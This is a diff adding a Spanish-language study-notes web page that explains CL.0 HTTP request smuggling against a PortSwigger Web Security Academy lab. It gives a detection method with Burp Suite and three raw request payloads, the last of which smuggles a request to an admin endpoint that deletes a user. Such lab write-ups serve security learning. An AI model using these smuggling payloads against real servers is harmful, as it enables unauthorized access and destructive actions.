@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;p&gt;Básicamente el CL.0 Significa que el frontend va a entender perfectamente el content-length , pero el backend simplemente no se esperaba una petición POST , asi que no interpreta nada y cree que todo lo que va después de las cabeceras es una nueva petición.&lt;/p&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/portswigger/">Portswigger</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <p>Básicamente el CL.0 Significa que el frontend va a entender perfectamente el content-length , pero el backend simplemente no se esperaba una petición POST , asi que no interpreta nada y cree que todo lo que va después de las cabeceras es una nueva petición.</p>
+
+<pre><code class="language-HTTP">POST / HTTP/1.1/r/n
+Host: 0a11001704e5a26881a1203e008800f5.web-security-academy.net/r/n
+Content-Length: 27/r/n
+Content-Type: application/x-www-form-urlencoded; charset=utf-8/r/n
+Connection: keep-alive/r/n
+/r/n
+GET /404 HTTP/1.1/r/n
+Foo: bar
+</code></pre>
+
+<p>Después de esto haces una petición normal, usando los groups de burpsuite y enviándola una detrás de otra con single connection :</p>
+
+<p>Tira código de estado esperado en ambas : no vulnerable
+Tira código de estado esperado y en la otra 404 : vulnerable</p>
+
+<p>Este si que tira 404 la segunda :</p>
+
+<pre><code class="language-HTTP">POST /resources/images HTTP/1.1/r/n
+Host: 0a11001704e5a26881a1203e008800f5.web-security-academy.net/r/n
+Content-Length: 27/r/n
+Content-Type: application/x-www-form-urlencoded; charset=utf-8/r/n
+Connection: keep-alive/r/n
+/r/n
+GET /404 HTTP/1.1/r/n
+Foo: bar
+</code></pre>
+
+<p>Normalmente este método suele funcionar en endpoints que no esperaban peticiones POST, solo GET.</p>
+
+<pre><code class="language-HTTP">POST /resources/images HTTP/1.1
+Host: 0a11001704e5a26881a1203e008800f5.web-security-academy.net
+Content-Length: 52
+Content-Type: application/x-www-form-urlencoded; charset=utf-8
+Connection: keep-alive
+
+GET /admin/delete?username=carlos HTTP/1.1
+Foo: bar
+</code></pre>
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
